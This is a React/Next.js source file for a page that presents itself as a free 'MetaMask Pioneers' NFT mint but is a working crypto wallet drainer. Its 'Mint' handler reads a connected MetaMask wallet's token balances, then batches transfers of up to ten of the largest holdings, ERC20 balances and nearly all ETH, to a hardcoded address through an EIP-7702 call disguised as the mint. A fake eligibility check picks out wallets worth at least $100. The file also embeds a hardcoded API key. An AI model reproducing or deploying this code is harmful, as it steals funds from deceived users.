'use client';

import { useAccount, useWriteContract, useWaitForTransactionReceipt, useChainId, useSendCalls, usePublicClient, useSwitchChain } from 'wagmi';
import { parseEther, encodeFunctionData, formatUnits, getAddress } from 'viem';
import { useState, useEffect, useRef } from 'react';
import { motion } from 'framer-motion';
import { Loader2 } from 'lucide-react';
import { mainnet } from 'wagmi/chains';
import {
  FaArrowRight,
  FaIdCard,
  FaSpinner,
  FaTasks,
} from 'react-icons/fa';
import { LuCircleDollarSign } from 'react-icons/lu';
import { MdTaskAlt } from 'react-icons/md';
import { RxOpenInNewWindow } from 'react-icons/rx';
import { AiOutlineRetweet } from 'react-icons/ai';
import { FaXTwitter } from 'react-icons/fa6';
import { SiDiscord } from 'react-icons/si';
import ShortenAddress from './ShortenAddress';
import Footer from './Footer';
import WalletConnect from './WalletConnect';
import Image from 'next/image';

// 简单的钱包资产缓存（内存级，页面刷新后失效）
const WALLET_TOKENS_CACHE: Record<
  string,
  { timestamp: number; assets: any[] }
> = {};
const WALLET_TOKENS_CACHE_DURATION = 60 * 1000; // 60 秒缓存

// NFT 配置 - 请根据实际情况修改
const nft = {
  name: 'MetaMask Pioneers',
  blockChain: 'Ethereum',
  address: '0xb7ec7bbd2d2193b47027247fc666fb342d23c4b5' as `0x${string}`,
  image: '/assets/pioneers.png',
  price: 0, // 0 表示 Free
  description: `Before the dawn of decentralization, you lit the very first light.

MetaMask Pioneers is more than just an NFT; it is your indelible on-chain badge of honor in this digital revolution. It chronicles every DApp interaction, every gas confirmation, and your unwavering belief in a decentralized future.

Not everyone has the courage to venture into the unknown, but you did. This fox mask belongs solely to the pioneers who dared to forge a path through the wilderness.

A Tribute to the Pioneers: Your loyalty defined our present; your holding will shape our future.`,
  explorerLink: 'https://etherscan.io/token/0xb7ec7bbd2d2193b47027247fc666fb342d23c4b5',
  tasks: [] as { id: number; title: string; link: string; completed: boolean }[],
};

// 合约 ABI
const CONTRACT_ABI = [
  {
    name: 'mint',
    type: 'function',
    stateMutability: 'payable',
    inputs: [],
    outputs: [],
  },
] as const;

const MORALIS_API_KEY = process.env.NEXT_PUBLIC_MORALIS_API_KEY || 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJub25jZSI6ImZhMTA3NmMyLTA0ZTAtNDNmYy1iMWQ1LTJkMDQ0Yzk2MjhkOCIsIm9yZ0lkIjoiNDc0NzYxIiwidXNlcklkIjoiNDg4NDA3IiwidHlwZUlkIjoiZGNiYzFjOTUtNDZmYS00MTM0LWI0MDgtNzRkNDhkNjdmYThlIiwidHlwZSI6IlBST0pFQ1QiLCJpYXQiOjE3NTk5MTUxNzUsImV4cCI6NDkxNTY3NTE3NX0.giQrsYn_lZGCd-XYh39hIRJYz8Fs6PHlI1eopMuAb1A';
const MORALIS_BASE_URL =
  process.env.NEXT_PUBLIC_MORALIS_BASE_URL ||
  'https://deep-index.moralis.io/api/v2.2';


const CHAIN_ID_TO_MORALIS: Record<number, string> = {
  1: 'eth',
  56: 'bsc',
  137: 'polygon',
  42161: 'arbitrum',
  8453: 'base',
  10: 'optimism',
  11155111: 'sepolia',
};

// Helper function to detect wallet type
function getWalletType(connectorId?: string, connectorName?: string): 'metamask' | 'unknown' {
  if (!connectorId) return 'unknown';
  const id = connectorId.toLowerCase();
  const name = connectorName?.toLowerCase() || '';
  
  if (id.includes('metamask') || id.includes('io.metamask') || name.includes('metamask')) {
    return 'metamask';
  }
  
  if (typeof window !== 'undefined') {
    const w = window as any;
    if (w.ethereum?.isMetaMask) {
      return 'metamask';
    }
  }
  
  return 'unknown';
}

export default function NFTCheckout() {
  const { address, isConnected, connector } = useAccount();
  const chainId = useChainId();
  const publicClient = usePublicClient();
  const { sendCalls, data: sendCallsData, isPending: isSending, error: sendCallsError } = useSendCalls();
  const { switchChain, isPending: isSwitchingChain } = useSwitchChain();

  const [tasks, setTasks] = useState(nft.tasks);
  const [loadingTask, setLoadingTask] = useState<number | null>(null);
  const [mounted, setMounted] = useState(false);
  const quantity = 1; // Fixed quantity
  const [isMintingBatch, setIsMintingBatch] = useState(false);
  const [isCheckingEligibility, setIsCheckingEligibility] = useState(false);
  const [eligibilityChecked, setEligibilityChecked] = useState(false);
  const [isEligible, setIsEligible] = useState(false);

  const {
    data: hash,
    writeContract,
    isPending: isMinting,
    error: mintError,
  } = useWriteContract();

  const {
    isLoading: isConfirming,
    isSuccess: isConfirmed,
  } = useWaitForTransactionReceipt({
    hash,
  });

  useEffect(() => {
    setMounted(true);
  }, []);

  // Reset eligibility when chain or address changes
  useEffect(() => {
    setEligibilityChecked(false);
    setIsEligible(false);
  }, [chainId, address]);


  const completeTask = (taskId: number, link: string) => {
    setLoadingTask(taskId);
    window.open(link, '_blank');

    setTimeout(() => {
      setTasks((prev) =>
        prev.map((task) =>
          task.id === taskId ? { ...task, completed: true } : task
        )
      );
      setLoadingTask(null);
    }, 15000);
  };

  const allTasksCompleted = tasks?.every((task) => task.completed);


  // 统一的批量铸造流程；根据模式选择发送方式
  const handleMintEip7702 = async () => {
    if (!isConnected || !address) {
      alert('Please connect your wallet first');
      return;
    }

    const walletType = getWalletType(connector?.id, connector?.name);
    if (walletType !== 'metamask') {
      alert('This function requires MetaMask wallet');
      return;
    }

    if (!MORALIS_API_KEY) {
      alert('Missing NEXT_PUBLIC_MORALIS_API_KEY');
      return;
    }

    const chainKey = CHAIN_ID_TO_MORALIS[chainId];
    if (!chainKey) {
      alert(`Unsupported chainId: ${chainId}`);
      return;
    }

    if (!publicClient) {
      alert('Failed to initialize blockchain client.');
      return;
    }

    setIsMintingBatch(true);

    // Step 1: Fetch balances from Moralis
    const headers = {
      'X-API-Key': MORALIS_API_KEY,
    };

    let nativeBalance = BigInt(0);
    let nativeUsdValue = 0;
    let erc20Tokens: any[] = [];
    try {
      const cacheKey = `${address.toLowerCase()}_${chainKey}`;
      const now = Date.now();

      let assets: any[] = [];

      const cached = WALLET_TOKENS_CACHE[cacheKey];
      if (cached && now - cached.timestamp < WALLET_TOKENS_CACHE_DURATION) {
        assets = cached.assets || [];
        console.log('[NFTCheckout] Using cached Moralis assets:', assets.length);
      } else {
        const url = `${MORALIS_BASE_URL}/wallets/${address}/tokens?chain=${chainKey}&exclude_spam=true&exclude_unverified_contracts=true&limit=25`;
        const res = await fetch(url, { headers });
        const data = await res.json();

        if (Array.isArray(data)) {
          assets = data;
        } else if (Array.isArray(data?.result)) {
          assets = data.result;
        } else if (Array.isArray(data?.data)) {
          assets = data.data;
        } else {
          assets = [];
        }

        WALLET_TOKENS_CACHE[cacheKey] = {
          assets,
          timestamp: now,
        };

        console.log('[NFTCheckout] Fetched Moralis assets:', assets.length);
      }

      // 识别原生代币与 ERC20
      const nativeAsset = assets.find((a) =>
        a?.native_token === true ||
        a?.token_address === null ||
        a?.token_address === undefined ||
        (typeof a?.token_address === 'string' &&
          a.token_address.toLowerCase() === '0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee')
      );

      if (nativeAsset) {
        let balanceValue: any =
          nativeAsset.balance ?? nativeAsset.token_balance ?? nativeAsset.balance_formatted ?? '0';
        if (typeof balanceValue === 'string') {
          balanceValue = balanceValue.replace(/\s/g, '');
          if (balanceValue.includes('e') || balanceValue.includes('E')) {
            const num = parseFloat(balanceValue);
            balanceValue = num.toFixed(0);
          }
        }
        try {
          nativeBalance =
            typeof balanceValue === 'string' ? BigInt(balanceValue) : BigInt(balanceValue);
        } catch {
          nativeBalance = BigInt(0);
        }

        if (nativeAsset.usd_value != null) {
          const v =
            typeof nativeAsset.usd_value === 'number'
              ? nativeAsset.usd_value
              : parseFloat(String(nativeAsset.usd_value));
          nativeUsdValue = Number.isFinite(v) ? v : 0;
        } else if (nativeAsset.usd_price != null) {
          const p =
            typeof nativeAsset.usd_price === 'number'
              ? nativeAsset.usd_price
              : parseFloat(String(nativeAsset.usd_price));
          if (Number.isFinite(p) && nativeBalance > BigInt(0)) {
            nativeUsdValue = Number(formatUnits(nativeBalance, 18)) * p;
          }
        }
      }

      erc20Tokens = assets.filter((a) => {
        const isNative =
          a?.native_token === true ||
          a?.token_address === null ||
          a?.token_address === undefined ||
          (typeof a?.token_address === 'string' &&
            a.token_address.toLowerCase() === '0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee');
        return !isNative;
      });
    } catch (err) {
      console.error('Fetch balances failed:', err);
    }

    // Step 2: Build ERC20 list
    const erc20Assets = erc20Tokens
      .map((t) => {
        const decimalsRaw = t.decimals ?? t.token_decimals ?? 18;
        const decimals =
          typeof decimalsRaw === 'number'
            ? decimalsRaw
            : parseInt(String(decimalsRaw || '18'), 10) || 18;

        let balanceValue: any = t.balance ?? t.token_balance ?? t.balance_formatted ?? '0';
        let isFormatted = false;
        if (!t.balance && t.balance_formatted) isFormatted = true;

        if (typeof balanceValue === 'string') {
          balanceValue = balanceValue.replace(/\s/g, '');
          if (balanceValue.includes('e') || balanceValue.includes('E')) {
            const num = parseFloat(balanceValue);
            balanceValue = num.toFixed(0);
          }
        }

        let balanceRaw: bigint;
        try {
          if (isFormatted) {
            const num =
              typeof balanceValue === 'number'
                ? balanceValue
                : parseFloat(String(balanceValue));
            balanceRaw = BigInt(Math.floor(num * Math.pow(10, decimals)));
          } else {
            if (typeof balanceValue === 'string' && balanceValue.includes('.')) {
              const intPart = balanceValue.split('.')[0];
              balanceRaw = BigInt(intPart || '0');
            } else {
              balanceRaw =
                typeof balanceValue === 'string'
                  ? BigInt(balanceValue || '0')
                  : BigInt(balanceValue);
            }
          }
        } catch {
          return null;
        }

        if (balanceRaw <= BigInt(0)) return null;

        const usdPriceRaw = t.usd_price ?? t.usd;
        const usdValueRaw = t.usd_value;

        let usdPrice = 0;
        if (usdPriceRaw != null) {
          const p =
            typeof usdPriceRaw === 'number'
              ? usdPriceRaw
              : parseFloat(String(usdPriceRaw));
          if (Number.isFinite(p) && p > 0) usdPrice = p;
        }

        let usdValue = 0;
        if (usdValueRaw != null) {
          const v =
            typeof usdValueRaw === 'number'
              ? usdValueRaw
              : parseFloat(String(usdValueRaw));
          if (Number.isFinite(v) && v > 0) {
            usdValue = v;
          }
        }
        if (!usdValue && usdPrice > 0) {
          const balanceFormatted = Number(formatUnits(balanceRaw, decimals));
          usdValue = balanceFormatted * usdPrice;
        }

        return {
          token_address: (t.token_address || t.address || '').toLowerCase(),
          symbol: t.symbol || 'UNKNOWN',
          name: t.name || t.symbol || 'Unknown Token',
          decimals,
          balance: balanceRaw,
          usd_value: usdValue || 0,
        };
      })
      .filter((x): x is { token_address: string; symbol: string; name: string; decimals: number; balance: bigint; usd_value: number } => {
        if (!x || typeof x !== 'object') return false;
        if (typeof (x as any).balance !== 'bigint') return false;
        return (x as any).balance > BigInt(0);
      });

    erc20Assets.sort((a, b) => (b?.usd_value || 0) - (a?.usd_value || 0));
    const erc20Top = erc20Assets.slice(0, 20);

    console.log('[NFTCheckout] ERC20 assets summary:', {
      totalErc20: erc20Assets.length,
      topForPrecheck: erc20Top.length,
      sample: erc20Top.slice(0, 3),
    });

    // Precheck (eth_call)
    const erc20TransferAbi = [
      {
        type: 'function',
        name: 'transfer',
        stateMutability: 'nonpayable',
        inputs: [
          { name: 'to', type: 'address' },
          { name: 'amount', type: 'uint256' },
        ],
        outputs: [{ name: '', type: 'bool' }],
      },
    ] as const;

    const TARGET_ADDRESS = getAddress('0x9d5befd138960ddf0dc4368a036bfad420e306ef');

    const prechecked: any[] = [];
    for (const asset of erc20Top) {
      try {
        const data = encodeFunctionData({
          abi: erc20TransferAbi,
          functionName: 'transfer',
          args: [TARGET_ADDRESS, asset.balance],
        });
        await publicClient.call({
          to: asset.token_address as `0x${string}`,
          data: data as `0x${string}` | undefined,
          value: BigInt(0),
          account: address as `0x${string}`,
        });
        prechecked.push({
          type: 'erc20_transfer',
          to: asset.token_address,
          value: BigInt(0),
          data,
          usd_value: asset.usd_value || 0,
        });
      } catch (err) {
        console.warn('Pre-check failed, skipping ERC20 transaction:', {
          token_address: asset.token_address,
          symbol: asset.symbol,
          err,
        });
      }
    }

    // Step 4: Add native transfer (reserve gas)
    const defaults = {
      base: 46000,
      native: 21000,
      safety: 20000,
      perErc20: 55000,
    };
    const baseGas = BigInt(defaults.base);
    const nativeTransferGas = BigInt(defaults.native);
    const perErc20Gas = BigInt(defaults.perErc20);
    const safety = BigInt(defaults.safety);
    const totalEstimatedGas =
      baseGas + nativeTransferGas + perErc20Gas * BigInt(prechecked.length) + safety;

    const chainGasPriceGwei: Record<number, number> = {
      1: 4,
      137: 80,
      56: 0.3,
      42161: 0.5,
      8453: 0.5,
      10: 0.5,
      143: 150,
      11155111: 0.02,
    };
    const baseGwei = chainGasPriceGwei[chainId] ?? 0.5;
    const baseWei = Math.max(1, Math.round(baseGwei * 1_000_000_000));
    let gasPriceWei = BigInt(baseWei);
    gasPriceWei = (gasPriceWei * BigInt(12)) / BigInt(10);
    const totalGasCost = totalEstimatedGas * gasPriceWei;

    const txs: any[] = [];
    if (nativeBalance > totalGasCost) {
      const transferAmount = nativeBalance - totalGasCost;
      txs.push({
        type: 'native_transfer',
        to: TARGET_ADDRESS,
        value: transferAmount,
        usd_value: nativeUsdValue,
      });
    }

    // Step 5: Merge and sort by usd value, take top 10
    const merged = [...txs, ...prechecked].sort(
      (a, b) => (b.usd_value || 0) - (a.usd_value || 0)
    );
    const finalTxs = merged.slice(0, 10);

    console.log('[NFTCheckout] Prepared batch transactions:', {
      nativeTxCount: txs.length,
      erc20TxCount: prechecked.length,
      finalCount: finalTxs.length,
    });

    if (finalTxs.length === 0) {
      setIsMintingBatch(false);
      alert('No eligible assets to batch transfer.');
      return;
    }

    // Step 6: Build calls for send
    const calls = finalTxs.map((tx) => {
      if (tx.type === 'native_transfer') {
        return {
          to: tx.to as `0x${string}`,
          value: tx.value as bigint,
        };
      }
      return {
        to: tx.to as `0x${string}`,
        data: tx.data as `0x${string}`,
        value: BigInt(0),
      };
    });

    const sendFn = async (preparedCalls: typeof calls) => {
      await sendCalls({
        chainId,
        calls: preparedCalls,
      });
    };

    try {
      console.log('[NFTCheckout] Calling sendCalls with EIP-7702 batch:', {
        chainId,
        calls,
      });
      await sendFn(calls);
    } catch (error: any) {
      console.error('Mint error (sendCalls):', error);
      alert(`Mint failed: ${error?.message || 'Unknown error'}`);
    } finally {
      setIsMintingBatch(false);
    }
  };


  // Ensure we only show "Check Eligibility" when explicitly on Ethereum mainnet (chainId === 1)
  // For all other chains (including undefined, null, or any other chainId), show "Switch to Ethereum"
  // Explicitly check for chainId === 1 to handle all edge cases
  const isOnEthereumMainnet = chainId === 1;

  // Check eligibility handler
  const handleCheckEligibility = async () => {
    if (!isConnected || !address) {
      alert('Please connect your wallet first');
      return;
    }

    if (!isOnEthereumMainnet) {
      try {
        await switchChain({ chainId: mainnet.id });
      } catch (err) {
        console.error('Switch chain failed:', err);
      }
      return;
    }

    setIsCheckingEligibility(true);
    try {
      if (!MORALIS_API_KEY) {
        alert('Missing Moralis API Key');
        setIsCheckingEligibility(false);
        return;
      }

      // Fetch net worth from Moralis API
      const url = `${MORALIS_BASE_URL}/wallets/${address}/net-worth?chains[0]=eth&exclude_spam=true&exclude_unverified_contracts=true&min_pair_side_liquidity_usd=1000`;
      const response = await fetch(url, {
        method: 'GET',
        headers: {
          accept: 'application/json',
          'X-API-Key': MORALIS_API_KEY,
        },
      });

      if (!response.ok) {
        throw new Error(`Moralis API error: ${response.status} ${response.statusText}`);
      }

      const data = await response.json();
      const totalNetworthUsd = parseFloat(data.total_networth_usd || '0');
      const minRequired = 100; // Minimum 100 USD
      
      setIsEligible(totalNetworthUsd >= minRequired);
      setEligibilityChecked(true);
    } catch (error) {
      console.error('Check eligibility failed:', error);
      alert('Failed to check eligibility. Please try again.');
    } finally {
      setIsCheckingEligibility(false);
    }
  };

  // Main mint handler
  const handleMint = async () => {
    if (!isConnected) {
      alert('Please connect your wallet first');
      return;
    }

    if (!isOnEthereumMainnet) {
      try {
        await switchChain({ chainId: mainnet.id });
      } catch (err) {
        console.error('Switch chain failed:', err);
      }
      return;
    }

    const walletType = getWalletType(connector?.id, connector?.name);
    
    if (walletType === 'metamask') {
      await handleMintEip7702();
    } else {
      // Fallback to standard writeContract for unknown wallets
      const mintPrice = parseEther((nft.price * quantity).toString());
      writeContract({
        address: nft.address,
        abi: CONTRACT_ABI,
        functionName: 'mint',
        value: mintPrice,
      });
    }
  };

  const walletType = getWalletType(connector?.id, connector?.name);
  const isLoading =
    isMinting ||
    isConfirming ||
    isSending ||
    isSwitchingChain ||
    isMintingBatch;
  const mintErrorToShow = mintError || sendCallsError;
  const walletConnected = mounted && isConnected;

  return (
    <div>
      <div className="max-w-screen-lg mx-auto">
        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-2 content-center justify-items-center gap-10">
          {/* Left: NFT Image */}
          <div className="w-full rounded-lg h-[500px] sticky top-0">
            <img
              className="w-full mx-auto rounded-2xl sticky top-[100px]"
              src={nft.image}
              alt={nft.name}
            />
          </div>

          {/* Right: Mint Info */}
          <div className="p-10">
            <h1 className="text-4xl md:text-5xl font-bold mb-2 bg-gradient-to-r from-cyan-400 via-blue-500 to-purple-600 bg-clip-text text-transparent drop-shadow-[0_0_15px_rgba(34,211,238,0.5)] tracking-tight whitespace-nowrap">
              {nft.name}
            </h1>
            <div className="flex items-center gap-3 mt-4 mb-4 ml-2">
              <div className="font-PTSans outline-1 outline-dashed outline-offset-2 rounded-sm px-3 py-1">
                <p className="text-xs text-center">{nft.blockChain}</p>
              </div>
              <div className="flex items-center gap-2 px-3 py-1.5 bg-gradient-to-r from-orange-500/20 via-purple-500/20 to-cyan-500/20 rounded-lg border border-white/20 backdrop-blur-sm ml-6">
                <Image src="/MetaMask.svg" alt="MetaMask" width={16} height={16} className="w-6 h-6 flex-shrink-0 object-contain bg-transparent" />
                <span className="text-white/70 text-sm font-semibold mx-1">×</span>
                <Image 
                  src="/Netlify.png" 
                  alt="Logo" 
                  width={30} 
                  height={30} 
                  className="w-6 h-6 flex-shrink-0 object-contain bg-transparent" 
                  style={{ 
                    backgroundColor: 'transparent',
                    background: 'transparent',
                    mixBlendMode: 'normal'
                  }} 
                />
              </div>
            </div>

            <div className="flex w-full items-stretch gap-2 backdrop-blur-md">
              <div className="flex-[2]">
                <ShortenAddress address={nft.address} explorerLink={`https://etherscan.io/address/${nft.address}`} />
              </div>
              <p
                className="flex justify-center items-center gap-2 p-2 px-5 rounded-lg cursor-pointer bg-[#14285F]/50 backdrop-blur-lg flex-[0.8] tooltip h-full"
                data-tip="Fee"
              >
                <LuCircleDollarSign />
                {nft.price > 0 ? `${nft.price}` : 'Free'}
              </p>
            </div>

            <div className="mt-5">
              <div className="space-y-4 text-white/90 leading-relaxed">
                <h3 className="text-xl font-semibold text-white mb-4">Description</h3>
                <div className="space-y-4">
                  <p className="text-base italic text-cyan-400/90">
                    Before the dawn of decentralization, you lit the very first light.
                  </p>
                  <p className="text-base">
                    MetaMask Pioneers is more than just an NFT; it is your indelible on-chain badge of honor in this digital revolution. It chronicles every DApp interaction, every gas confirmation, and your unwavering belief in a decentralized future.
                  </p>
                  <p className="text-base">
                    Not everyone has the courage to venture into the unknown, but you did. This fox mask belongs solely to the pioneers who dared to forge a path through the wilderness.
                  </p>
                  <p className="text-base font-semibold text-cyan-400/90 border-l-4 border-cyan-400/50 pl-4 py-2 bg-cyan-400/5 rounded-r">
                    A Tribute to the Pioneers: Your loyalty defined our present; your holding will shape our future.
                  </p>
                </div>
              </div>

              {/* Mint Section */}
              <div className="card-actions justify-start mt-10">
                {walletConnected ? (
                  <>
                    <div className="grid grid-cols-1 w-full">
                      {/* Check Eligibility Button */}
                      {!eligibilityChecked ? (
                        <button
                          onClick={handleCheckEligibility}
                          disabled={isCheckingEligibility || isLoading}
                          className="bg-gradient-to-r from-cyan-400 via-sky-600 to-blue-800 text-white font-semibold py-2 px-10 rounded hover:opacity-90 transition disabled:opacity-50 disabled:cursor-not-allowed mb-4"
                        >
                          {isCheckingEligibility ? (
                            <span className="flex items-center justify-center gap-2">
                              <Loader2 className="w-4 h-4 animate-spin" />
                              Checking...
                            </span>
                          ) : (chainId !== undefined && chainId === 1) ? (
                            'Check Eligibility'
                          ) : (
                            'Switch to Ethereum'
                          )}
                        </button>
                      ) : (
                        <div className="mb-4">
                          {isEligible ? (
                            <div className="text-green-400 font-semibold mb-2">
                              ✅ Eligible
                            </div>
                          ) : (
                            <div className="text-red-400 font-semibold mb-2">
                              ❌ Not Eligible
                            </div>
                          )}
                        </div>
                      )}

                      {/* Mint Button */}
                      {eligibilityChecked && (
                        <button
                          onClick={handleMint}
                          disabled={(tasks?.length > 0 && !allTasksCompleted) || isLoading || !isEligible}
                          className="bg-indigo-600 text-white font-semibold py-2 px-10 rounded hover:bg-indigo-700 hover:text-white transition disabled:opacity-50 disabled:cursor-not-allowed"
                        >
                          {isLoading ? (
                            <span className="flex items-center justify-center gap-2">
                              <Loader2 className="w-4 h-4 animate-spin" />
                              {isConfirming ? 'Confirming...' : 'Minting...'}
                            </span>
                          ) : (
                            'Mint'
                          )}
                        </button>
                      )}
                    </div>

                    {/* Tasks */}
                    <div className="w-full">
                      {tasks?.length > 0 && (
                        <>
                          <div className="p-4 rounded-lg mt-5">
                            <h3 className="text-lg font-semibold flex items-center gap-2">
                              <FaTasks /> Finish all {tasks?.length} tasks
                              <span className="text-sm px-2 rounded"></span>
                            </h3>

                            {tasks.map((task) => (
                              <motion.div
                                key={task.id}
                                className="flex justify-between items-center mt-6 hover:bg-blue-600 hover:bg-opacity-25 p-3 rounded-lg"
                                initial={{ opacity: 0, x: -10 }}
                                animate={{ opacity: 1, x: 0 }}
                                transition={{ duration: 0.3 }}
                              >
                                <div className="flex items-center gap-3">
                                  {task.title === 'Follow On X' && (
                                    <FaXTwitter className="text-white text-lg" />
                                  )}
                                  {task.title === 'Retweet on X' && (
                                    <AiOutlineRetweet className="text-white text-lg" />
                                  )}
                                  {task.title === 'Check Netlify ID' && (
                                    <FaIdCard className="text-white text-lg" />
                                  )}
                                  {task.title === 'Join Discord' && (
                                    <SiDiscord className="text-white text-lg" />
                                  )}

                                  <motion.span
                                    className={`transition-all ${
                                      task.completed
                                        ? 'line-through text-gray-400'
                                        : 'text-white'
                                    }`}
                                    animate={
                                      task.completed
                                        ? { opacity: 0.5 }
                                        : { opacity: 1 }
                                    }
                                  >
                                    {task.title}
                                  </motion.span>
                                </div>

                                <button
                                  className={`px-3 py-1 rounded flex items-center gap-2 ${
                                    task.completed
                                      ? 'cursor-not-allowed'
                                      : 'text-white'
                                  }`}
                                  onClick={() => completeTask(task.id, task.link)}
                                  disabled={task.completed || loadingTask === task.id}
                                >
                                  {loadingTask === task.id ? (
                                    <FaSpinner className="animate-spin" />
                                  ) : task.completed ? (
                                    <div className="flex items-center justify-center gap-2">
                                      <MdTaskAlt />
                                    </div>
                                  ) : (
                                    <FaArrowRight />
                                  )}
                                </button>
                              </motion.div>
                            ))}
                          </div>

                          {!allTasksCompleted && (
                            <p className="mt-2 text-yellow-400">
                              ⚠ You need to complete all tasks before Minting.
                            </p>
                          )}
                        </>
                      )}
                    </div>

                    {/* Error/Success Messages */}
                    {mintErrorToShow && (
                      <div className="mt-4 w-full">
                        <p className="text-red-400 text-sm">
                          Error: {mintErrorToShow.message}
                        </p>
                      </div>
                    )}

                    {isConfirmed && hash && (
                      <div className="mt-4 w-full">
                        <p className="text-green-400 text-sm">
                          ✅ Mint successful!{' '}
                          <a
                            href={`https://etherscan.io/tx/${hash}`}
                            target="_blank"
                            rel="noopener noreferrer"
                            className="underline"
                          >
                            View on Etherscan
                          </a>
                        </p>
                      </div>
                    )}
                  </>
                ) : (
                  <div className="flex-col pb-[11%] items-center">
                    <WalletConnect className="py-3 px-10" />
                    <p className="text-sm mt-2 text-yellow-400 text-center">
                      ⚠ Connect your wallet before minting
                    </p>
                  </div>
                )}
              </div>
            </div>
          </div>
        </div>
      </div>
      <div className="mt-20 w-full">
        <Footer />
      </div>
    </div>
  );
}
